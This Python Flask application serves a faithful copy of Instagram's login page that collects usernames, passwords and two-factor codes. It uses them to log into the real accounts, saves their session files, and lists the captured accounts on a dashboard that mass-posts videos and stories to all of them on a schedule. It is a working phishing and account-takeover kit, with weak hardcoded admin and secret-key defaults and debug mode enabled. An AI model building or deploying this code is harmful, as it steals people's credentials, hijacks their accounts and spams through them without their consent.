from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import os
import json
import time
import logging
import random
from instagrapi import Client
from instagrapi.exceptions import TwoFactorRequired, PleaseWaitFewMinutes
from datetime import datetime
import threading

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'admin-secret-key-2026')
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

accounts = []
uploaded_videos = []
scheduled_jobs = []
daily_caption = "🎬 New video! Follow for more #instagram #trending"
posts_today = 0
post_date = datetime.now().date()

# ==================== INSTAGRAM UI CLONE HTML ====================
INSTAGRAM_LOGIN_UI = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-container {
            display: flex;
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 20px;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
        }
        .phone-preview {
            flex: 1;
            min-width: 380px;
            display: none;
        }
        @media (min-width: 875px) {
            .phone-preview {
                display: block;
            }
        }
        .phone-preview img {
            max-width: 100%;
            height: auto;
        }
        .login-box {
            flex: 0 0 350px;
            max-width: 350px;
            width: 100%;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px 30px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo svg {
            width: 175px;
            height: 51px;
        }
        .input-group {
            margin-bottom: 6px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 9px 8px 7px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
            transition: border 0.1s;
            height: 36px;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
            background: white;
        }
        .login-btn {
            width: 100%;
            padding: 8px 0;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
            height: 32px;
            transition: background 0.2s;
        }
        .login-btn:hover {
            background: #1877f2;
        }
        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .facebook-login {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            margin: 8px 0;
        }
        .facebook-login svg {
            width: 20px;
            height: 20px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
            display: block;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px 30px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .error-msg {
            color: #ed4956;
            font-size: 13px;
            margin-bottom: 10px;
            text-align: center;
        }
        .success-msg {
            color: #28a745;
            font-size: 13px;
            margin-bottom: 10px;
            text-align: center;
        }
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .twofa-input {
            display: none;
            margin-top: 8px;
        }
        .twofa-input.show {
            display: block;
        }
        .meta-links {
            text-align: center;
            margin-top: 20px;
        }
        .meta-links a {
            color: #8e8e8e;
            font-size: 11px;
            text-decoration: none;
            margin: 0 8px;
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="phone-preview">
        <img src="https://www.instagram.com/static/images/homepage/phones/home-phones-2x.png" alt="Instagram preview">
    </div>
    <div class="login-box">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 175 51" fill="none">
                    <path d="M53.5 17.5c-1.8 0-3.3.8-4.3 2.1V10h-3.8v25.4h3.8V26c0-2.5 1.5-4.2 4.1-4.2 2.5 0 4 1.7 4 4.2v9.4h3.8V25.8c0-4.5-2.7-8.3-7.6-8.3zm13.9 3.6c-1.8 0-3.4.8-4.4 2.1v-5.2h-3.8v17.4h3.8V29c0-2.5 1.5-4.2 4.1-4.2 2.5 0 4 1.7 4 4.2v9.4h3.8V25.8c0-4.5-2.8-8.3-7.5-8.3zm16.1 0c-3.8 0-6.5 3.1-6.5 7.5s2.7 7.5 6.5 7.5c3.9 0 6.5-3.1 6.5-7.5s-2.6-7.5-6.5-7.5zm0 11.8c-2.1 0-3.6-1.7-3.6-4.3 0-2.6 1.5-4.3 3.6-4.3 2.1 0 3.6 1.7 3.6 4.3 0 2.6-1.5 4.3-3.6 4.3zm12.4-15.4h-3.8V31c0 1.5 1.1 2.5 2.6 2.5h1.2v3.2c-1.2.3-2.2.5-3.4.5-3.6 0-5.2-2.2-5.2-5.4V17.5h-3.8v17.4c0 4.2 2.4 7.2 7.3 7.2 1.5 0 2.9-.3 4.2-.8v-6.8h-1.3c-1.5 0-2.6-1-2.6-2.5V17.5h3.8zm8.3 17.4V10h-3.8v25.4h3.8zm1.2-15.2c0-2.6 1.7-4.3 4.2-4.3 2.5 0 4.1 1.7 4.1 4.3v15.2h3.8V21.2c0-4.5-2.7-8.3-7.5-8.3-1.8 0-3.4.8-4.4 2.1v-5.2h-3.8v17.4h3.8V21.2c0-2.5 1.5-4.2 4.1-4.2 2.5 0 4 1.7 4 4.2v9.4h3.8V21.2h-3.8zM0 25.5C0 11.4 11.4 0 25.5 0S51 11.4 51 25.5 39.6 51 25.5 51 0 39.6 0 25.5z" fill="#0095f6"/>
                </svg>
            </div>

            {% if error %}
            <div class="error-msg">{{ error }}</div>
            {% endif %}
            {% if success %}
            <div class="success-msg">{{ success }}</div>
            {% endif %}

            <form id="loginForm" method="POST" action="/instagram_login">
                <div class="input-group">
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <div class="input-group twofa-input" id="twofaGroup">
                    <input type="text" id="twofa" name="twofa" placeholder="6-digit verification code">
                </div>
                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
            </form>

            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">OR</div>
                <div class="divider-line"></div>
            </div>

            <a href="#" class="facebook-login">
                <svg viewBox="0 0 20 20"><path d="M20 10c0-5.5-4.5-10-10-10S0 4.5 0 10c0 5 3.7 9.1 8.4 9.9v-7H5.9V10h2.5V7.8c0-2.5 1.5-3.8 3.7-3.8 1.1 0 2.2.2 2.2.2v2.5h-1.2c-1.2 0-1.6.8-1.6 1.6V10h2.8l-.4 2.9h-2.4v7C16.3 19.1 20 15 20 10z" fill="#1877f2"/></svg>
                Log in with Facebook
            </a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="meta-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
    </div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    const btn = document.getElementById('loginBtn');
    btn.innerHTML = '<span class="loading"></span> Logging in...';
    btn.disabled = true;
});
</script>
</body>
</html>
"""

# ==================== ROUTES ====================

@app.route('/', methods=['GET'])
def index():
    """Instagram UI clone with login form"""
    return render_template_string(INSTAGRAM_LOGIN_UI, error=None, success=None)

@app.route('/instagram_login', methods=['POST'])
def instagram_login():
    """Real Instagram login using instagrapi"""
    global accounts
    try:
        username = request.form.get('username')
        password = request.form.get('password')
        twofa = request.form.get('twofa', '')

        if not username or not password:
            return render_template_string(INSTAGRAM_LOGIN_UI, 
                error='Please enter username and password.', success=None)

        cl = Client()

        # 🔥 REAL Instagram login — same as mobile app
        if twofa:
            cl.login(username, password, verification_code=twofa)
        else:
            try:
                cl.login(username, password)
            except TwoFactorRequired:
                # Show 2FA input
                return render_template_string(INSTAGRAM_LOGIN_UI, 
                    error='2FA required! Please enter verification code.', success=None)
            except PleaseWaitFewMinutes:
                return render_template_string(INSTAGRAM_LOGIN_UI, 
                    error='Too many attempts. Wait a few minutes.', success=None)
            except Exception as e:
                return render_template_string(INSTAGRAM_LOGIN_UI, 
                    error=f'Login failed: {str(e)}', success=None)

        logged_username = cl.username

        # 💾 Session save — next time direct login without password
        os.makedirs('sessions', exist_ok=True)
        session_file = f"sessions/{logged_username}.json"
        cl.dump_settings(session_file)

        if any(acc.get('username') == logged_username for acc in accounts):
            return render_template_string(INSTAGRAM_LOGIN_UI, 
                error=f'Account @{logged_username} already added.', success=None)

        accounts.append({
            'username': logged_username,
            'session_file': session_file,
            'client': cl,
            'valid': True
        })

        logger.info(f"✅ Added account: @{logged_username}")
        
        # 🔄 Redirect to admin dashboard
        return redirect(url_for('admin'))

    except Exception as e:
        logger.error(f"Login error: {e}")
        return render_template_string(INSTAGRAM_LOGIN_UI, 
            error=f'Login failed: {str(e)}', success=None)

# ==================== ADMIN DASHBOARD ====================

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><title>Admin Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#fafafa;padding:20px}
.container{max-width:1000px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;flex-wrap:wrap}
.header h1{font-size:28px}
.header h1 span{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logout-btn{background:#dc3545;color:white;border:none;padding:8px 20px;border-radius:5px;cursor:pointer}
.card{background:white;border-radius:12px;padding:24px;margin-bottom:20px;border:1px solid #dbdbdb}
.card h3{font-size:16px;margin-bottom:12px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
.stat-box{background:#f8f9fa;padding:15px;border-radius:8px;text-align:center}
.stat-box .num{font-size:28px;font-weight:700;color:#0095f6}
input,textarea{width:100%;padding:10px 12px;border:1px solid #dbdbdb;border-radius:8px;font-size:14px;background:#fafafa}
button{background:#0095f6;color:white;border:none;padding:10px 20px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
button:hover{background:#0077cc}
button.danger{background:#dc3545}
button.success{background:#28a745}
.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.flex{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.account-item{display:flex;justify-content:space-between;padding:10px 14px;background:#f8f9fa;border-radius:8px;margin-bottom:6px;border-left:4px solid #28a745}
.msg{padding:10px 14px;border-radius:8px;margin-top:10px}
.msg.success{background:#e8f5e9;color:#2e7d32}
.msg.error{background:#fbe9e7;color:#c62828}
.msg.info{background:#e3f2fd;color:#0d47a1}
.hidden{display:none}
.mt-10{margin-top:10px}
</style>
</head>
<body>
<div class="container">
<div class="header"><h1>📸 <span>Admin Dashboard</span></h1>
<a href="/" style="color:#0095f6;text-decoration:none">➕ Add Account</a>
<form method="POST" action="/logout" style="display:inline"><button class="logout-btn" type="submit">🚪 Logout</button></form>
</div>

<div class="stats">
<div class="stat-box"><div class="num">{{ accounts|length }}</div><div>Accounts</div></div>
<div class="stat-box"><div class="num">{{ active_accounts }}</div><div>Active</div></div>
<div class="stat-box"><div class="num">{{ posts_today }}</div><div>Posts Today</div></div>
<div class="stat-box"><div class="num">{{ uploaded_videos|length }}</div><div>Videos</div></div>
</div>

<!-- Account List -->
<div class="card"><h3>📋 Accounts</h3>
{% for acc in accounts %}
<div class="account-item"><span>@{{ acc.username }}</span>
<span>{% if acc.valid %}✅ Active{% else %}❌ Invalid{% endif %}</span>
<button class="danger" onclick="removeAccount('{{ acc.username }}')">✕</button></div>
{% else %}<p>No accounts added. <a href="/">Add one</a></p>{% endfor %}
</div>

<!-- Upload Video -->
<div class="card"><h3>📤 Upload Video</h3>
<input type="file" id="videoFile" accept="video/*">
<button class="success" onclick="uploadVideo()">Upload</button>
<div id="uploadMsg" class="hidden"></div>
</div>

<!-- Post -->
<div class="card"><h3>📤 Post</h3>
<div class="flex">
<button onclick="postRandomVideo()">🎲 Post Video to All</button>
<button onclick="postRandomStory()">📸 Post Story to All</button>
</div>
<div id="postMsg" class="hidden"></div>
</div>

<!-- Schedule -->
<div class="card"><h3>⏰ Schedule</h3>
<div class="row">
<div><label>Time</label><input type="time" id="schedTime" value="08:00"></div>
<div><label>Type</label><select id="schedType"><option value="video">Video</option><option value="story">Story</option></select></div>
</div>
<button onclick="schedulePost()">Schedule</button>
<div id="schedMsg" class="hidden"></div>
</div>

<!-- Scheduled Jobs -->
<div class="card"><h3>📅 Scheduled Jobs</h3>
{% for job in scheduled_jobs %}<div class="account-item"><span>🕐 {{ job.time }} - {{ job.type }}</span><span class="badge">{{ job.status }}</span></div>{% else %}<p>No scheduled jobs</p>{% endfor %}
</div>
</div>

<script>
function removeAccount(username) {
    if (!confirm('Remove @' + username + '?')) return;
    fetch('/remove_account', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: username})
    })
    .then(res => res.json())
    .then(data => { if (data.status === 'success') location.reload(); });
}

function uploadVideo() {
    const file = document.getElementById('videoFile').files[0];
    if (!file) { alert('Select a video'); return; }
    const formData = new FormData();
    formData.append('video', file);
    showMsg('uploadMsg', '⏳ Uploading...', 'info');
    fetch('/upload_video', {
        method: 'POST',
        body: formData
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'success') {
            showMsg('uploadMsg', '✅ ' + data.message, 'success');
            setTimeout(() => location.reload(), 1500);
        } else {
            showMsg('uploadMsg', '❌ ' + data.message, 'error');
        }
    });
}

function postRandomVideo() {
    if (!confirm('Post to ALL accounts?')) return;
    showMsg('postMsg', '⏳ Processing...', 'info');
    fetch('/post_random_video', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'}
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'success') {
            showMsg('postMsg', '✅ ' + data.message, 'success');
        } else {
            showMsg('postMsg', '❌ ' + data.message, 'error');
        }
    });
}

function postRandomStory() {
    if (!confirm('Post story to ALL accounts?')) return;
    showMsg('postMsg', '⏳ Processing...', 'info');
    fetch('/post_random_story', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'}
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'success') {
            showMsg('postMsg', '✅ ' + data.message, 'success');
        } else {
            showMsg('postMsg', '❌ ' + data.message, 'error');
        }
    });
}

function schedulePost() {
    const time = document.getElementById('schedTime').value;
    const type = document.getElementById('schedType').value;
    if (!time) { alert('Select time'); return; }
    fetch('/schedule_post', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({time: time, type: type})
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'success') {
            showMsg('schedMsg', '✅ ' + data.message, 'success');
            setTimeout(() => location.reload(), 1500);
        } else {
            showMsg('schedMsg', '❌ ' + data.message, 'error');
        }
    });
}

function showMsg(id, text, type) {
    const el = document.getElementById(id);
    el.className = 'msg ' + type;
    el.textContent = text;
    el.style.display = 'block';
}
</script>
</body>
</html>
"""

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    active = len([a for a in accounts if a.get('valid', False)])
    return render_template_string(ADMIN_HTML, accounts=accounts, active_accounts=active,
                                   posts_today=posts_today, uploaded_videos=uploaded_videos,
                                   scheduled_jobs=scheduled_jobs)

# ==================== OTHER ROUTES ====================

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/remove_account', methods=['POST'])
def remove_account():
    global accounts
    username = request.json.get('username')
    accounts = [acc for acc in accounts if acc.get('username') != username]
    return jsonify({'status': 'success', 'message': f'Removed @{username}'})

@app.route('/upload_video', methods=['POST'])
def upload_video():
    try:
        if 'video' not in request.files:
            return jsonify({'status': 'error', 'message': 'No video file'})
        file = request.files['video']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'})
        os.makedirs('uploads', exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{timestamp}_{file.filename}"
        filepath = os.path.join('uploads', filename)
        file.save(filepath)
        uploaded_videos.append({
            'filename': filename,
            'path': filepath,
            'upload_time': datetime.now().strftime('%H:%M')
        })
        return jsonify({'status': 'success', 'message': f'Video uploaded: {filename}'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/post_random_video', methods=['POST'])
def post_random_video():
    try:
        if not uploaded_videos:
            return jsonify({'status': 'error', 'message': 'No videos uploaded'})
        active = [a for a in accounts if a.get('valid', False)]
        if not active:
            return jsonify({'status': 'error', 'message': 'No active accounts'})
        video = random.choice(uploaded_videos)
        success_count = 0
        failed = []
        for acc in active:
            try:
                cl = Client()
                cl.load_settings(acc['session_file'])
                cl.login(acc['username'], '')
                cl.clip_upload(video['path'], daily_caption)
                success_count += 1
                global posts_today
                posts_today += 1
                logger.info(f"✅ Posted on @{acc['username']}")
            except Exception as e:
                failed.append(f"@{acc['username']}: {str(e)[:30]}")
                logger.error(f"❌ Failed on @{acc['username']}: {e}")
            time.sleep(30)
        message = f"✅ Posted on {success_count}/{len(active)} accounts"
        if failed:
            message += f" | Failed: {', '.join(failed)}"
        return jsonify({'status': 'success', 'message': message})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/post_random_story', methods=['POST'])
def post_random_story():
    try:
        if not uploaded_videos:
            return jsonify({'status': 'error', 'message': 'No videos uploaded'})
        active = [a for a in accounts if a.get('valid', False)]
        if not active:
            return jsonify({'status': 'error', 'message': 'No active accounts'})
        video = random.choice(uploaded_videos)
        success_count = 0
        for acc in active:
            try:
                cl = Client()
                cl.load_settings(acc['session_file'])
                cl.login(acc['username'], '')
                cl.video_upload_to_story(video['path'])
                success_count += 1
                logger.info(f"✅ Story posted on @{acc['username']}")
            except Exception as e:
                logger.error(f"❌ Story failed on @{acc['username']}: {e}")
            time.sleep(30)
        return jsonify({'status': 'success', 'message': f'Story posted on {success_count}/{len(active)} accounts'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/schedule_post', methods=['POST'])
def schedule_post():
    try:
        time_str = request.json.get('time')
        post_type = request.json.get('type', 'video')
        if not time_str:
            return jsonify({'status': 'error', 'message': 'Time required'})
        scheduled_jobs.append({'time': time_str, 'type': post_type, 'status': 'pending'})
        return jsonify({'status': 'success', 'message': f'Scheduled at {time_str} ({post_type})'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

# ==================== SCHEDULER ====================
def scheduler_loop():
    global posts_today, post_date
    while True:
        try:
            now = datetime.now()
            current_time = now.strftime('%H:%M')
            today = now.date()
            if post_date != today:
                posts_today = 0
                post_date = today
            for job in scheduled_jobs[:]:
                if job['time'] == current_time and job['status'] == 'pending':
                    job['status'] = 'running'
                    active = [a for a in accounts if a.get('valid', False)]
                    if active and uploaded_videos:
                        video = random.choice(uploaded_videos)
                        for acc in active:
                            try:
                                cl = Client()
                                cl.load_settings(acc['session_file'])
                                cl.login(acc['username'], '')
                                if job['type'] == 'video':
                                    cl.clip_upload(video['path'], daily_caption)
                                else:
                                    cl.video_upload_to_story(video['path'])
                                posts_today += 1
                            except Exception as e:
                                logger.error(f"Scheduled error: {e}")
                            time.sleep(30)
                    job['status'] = 'completed'
        except Exception as e:
            logger.error(f"Scheduler error: {e}")
        time.sleep(30)

threading.Thread(target=scheduler_loop, daemon=True).start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
